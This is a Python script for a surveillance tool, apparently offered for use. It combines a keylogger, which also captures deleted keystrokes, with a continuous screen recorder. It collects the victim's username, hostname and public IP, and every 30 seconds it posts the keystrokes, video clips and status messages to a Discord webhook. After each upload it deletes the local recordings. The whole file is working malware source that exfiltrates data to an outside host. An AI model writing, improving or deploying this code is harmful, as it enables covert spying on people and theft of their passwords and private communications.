import mss
import numpy as np
import imageio.v2 as imageio
import requests
import os
import time
import getpass
import socket
from datetime import datetime
from pynput import keyboard 

FPS = 20
DURATION = 15
FRAME_COUNT = FPS * DURATION

WEBHOOK_URL = "YOUR_WEBHOOK_URL" # Your discord webhook

# --- Global variables for keylogging ---
logged_keys_buffer = []
deleted_keys_buffer = []
last_log_send_time = time.time()
KEYLOG_INTERVAL = 30 # Send keylogs every 30 seconds

# --- System Information ---
USER = getpass.getuser()
HOST = socket.gethostname()
try:
    IP = requests.get("https://ipv4.jsonip.com", timeout=5).json()["ip"]
except (requests.exceptions.RequestException, KeyError):
    IP = "Could not retrieve IP"
START_TIME = datetime.utcnow().isoformat()

# --- Helper function for sending embeds ---
def send_embed(title, description, color=3447003):
    """Sends an embed message to the configured webhook."""
    try:
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": title,
                "description": description,
                "color": color,
                "timestamp": datetime.utcnow().isoformat()
            }]
        }, timeout=10) # Add a timeout for webhook requests
    except requests.exceptions.RequestException as e:
        print(f"Error sending embed: {e}")

# --- Keylogging functionality ---
def on_press(key):
    """Callback function for key presses."""
    global logged_keys_buffer, deleted_keys_buffer

    try:
        key_str = key.char
        if key_str is None: # Special keys
            if key == keyboard.Key.enter:
                key_str = " [ENTER] "
            elif key == keyboard.Key.space:
                key_str = " "
            elif key == keyboard.Key.backspace:
                # Handle backspace: remove the last logged character
                if deleted_keys_buffer and logged_keys_buffer:
                    # If we have deleted words recorded, we try to simulate backspace there too
                    deleted_keys_buffer.append(logged_keys_buffer.pop())
                elif logged_keys_buffer:
                    logged_keys_buffer.pop()
                key_str = None # Don't append anything for backspace itself
            else:
                key_str = f" [{str(key).replace('Key.', '').upper()}] " # Format other special keys
    except AttributeError:
        # For keys that don't have a .char attribute (like modifier keys)
        if key == keyboard.Key.enter:
            key_str = " [ENTER] "
        elif key == keyboard.Key.space:
            key_str = " "
        elif key == keyboard.Key.backspace:
            if deleted_keys_buffer and logged_keys_buffer:
                deleted_keys_buffer.append(logged_keys_buffer.pop())
            elif logged_keys_buffer:
                logged_keys_buffer.pop()
            key_str = None
        else:
            key_str = f" [{str(key).replace('Key.', '').upper()}] "

    if key_str:
        logged_keys_buffer.append(key_str)

def format_keylog_embed():
    """Formats the keylogged data into a Discord embed, inspired by HazuDev."""
    logged_content = "".join(logged_keys_buffer)
    deleted_content = "".join(reversed(deleted_keys_buffer)) # Show deleted keys in order they were deleted

    # Construct the embed title and description
    title = f"Keys logged"
    description = f"> **Logged Data:**\n```\n{logged_content}\n```"

    embed_data = {
        "title": title,
        "description": description,
        "color": 808080, # Grey color
        "timestamp": datetime.utcnow().isoformat(),
        "fields": [
            {"name": "IP Address", "value": IP, "inline": True},
            {"name": "Session Start", "value": START_TIME, "inline": True},
            {"name": "Deleted Keystrokes", "value": f"```\n{deleted_content}\n```" if deleted_content else "None", "inline": False}
        ]
    }
    return embed_data

def send_keylogs():
    """Sends the buffered keylogs as a formatted embed."""
    if not logged_keys_buffer and not deleted_keys_buffer:
        return # Nothing to send

    embed_payload = format_keylog_embed()

    try:
        response = requests.post(WEBHOOK_URL, json={
            "embeds": [embed_payload]
        }, timeout=10)
        if response.status_code in (200, 204):
            print("Keylogs sent successfully.")
            # Clear buffers only upon successful send
            logged_keys_buffer.clear()
            deleted_keys_buffer.clear()
        else:
            print(f"Failed to send keylogs. Status code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending keylogs: {e}")

# --- Screen recording ---
def record_screen(filename):
    """Records the screen for a fixed duration and saves it to a file."""
    with mss.MSS() as sct:
        monitor = sct.monitors[1]

        width = (monitor["width"] // 16) * 16
        height = (monitor["height"] // 16) * 16

        try:
            with imageio.get_writer(
                filename,
                fps=FPS,
                codec="libx264",
                quality=8
            ) as writer:
                for _ in range(FRAME_COUNT):
                    img = sct.grab(monitor)
                    frame = np.array(img)
                    frame = frame[:, :, :3] # BGRA -> RGB
                    frame = frame[:, :, ::-1] # Flip to get correct RGB order
                    writer.append_data(frame)
        except Exception as e:
            print(f"Error during screen recording: {e}")
            # Attempt to clean up potentially incomplete file
            if os.path.exists(filename):
                os.remove(filename)

# --- File upload ---
def send_file(filename):
    """Uploads the recorded video file to the webhook."""
    try:
        with open(filename, "rb") as f:
            files = {"file": (filename, f, "video/mp4")}
            response = requests.post(WEBHOOK_URL, files=files, timeout=60) # Increased timeout for uploads
        return response.status_code in (200, 204)
    except FileNotFoundError:
        print(f"Error: File not found at {filename}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"Error uploading file: {e}")
        return False

# --- Main loop and threading ---
def main_loop():
    """Manages the recording, uploading, and keylogging cycles."""
    global last_log_send_time
    clip_counter = 0

    # ✔ Startup identity message
    send_embed(
        "🟢 Recorder Online",
        f"User: **{USER}**\nMachine: **{HOST}**\nStatus: Active",
        color=5763719
    )

    # Start the keyboard listener in a separate thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        current_time = time.time()

        # --- Keylogging Interval Check ---
        # Send keylogs if interval has passed or if there's data accumulated
        if current_time - last_log_send_time >= KEYLOG_INTERVAL or logged_keys_buffer:
            send_keylogs()
            last_log_send_time = current_time

        clip_counter += 1
        filename = f"clip_{datetime.now().strftime('%H%M%S')}_{clip_counter}.mp4"

        # --- Recording ---
        send_embed(
            "🎥 Recording",
            f"Clip #{clip_counter}",
            color=15105570
        )
        record_screen(filename)

        # --- Uploading ---
        send_embed(
            "📤 Uploading",
            f"Clip #{clip_counter}",
            color=3447003
        )
        success = send_file(filename)

        if success:
            send_embed(
                "✅ Uploaded",
                f"Clip #{clip_counter} complete.\nDeleting local file.",
                color=3066993
            )
            try:
                os.remove(filename)
            except OSError as e:
                print(f"Error deleting file {filename}: {e}")
        else:
            send_embed(
                "❌ Upload Failed",
                f"Clip #{clip_counter} kept locally.",
                color=15158332
            )



        time.sleep(1)


    listener.stop()


if __name__ == "__main__":
    main_loop()
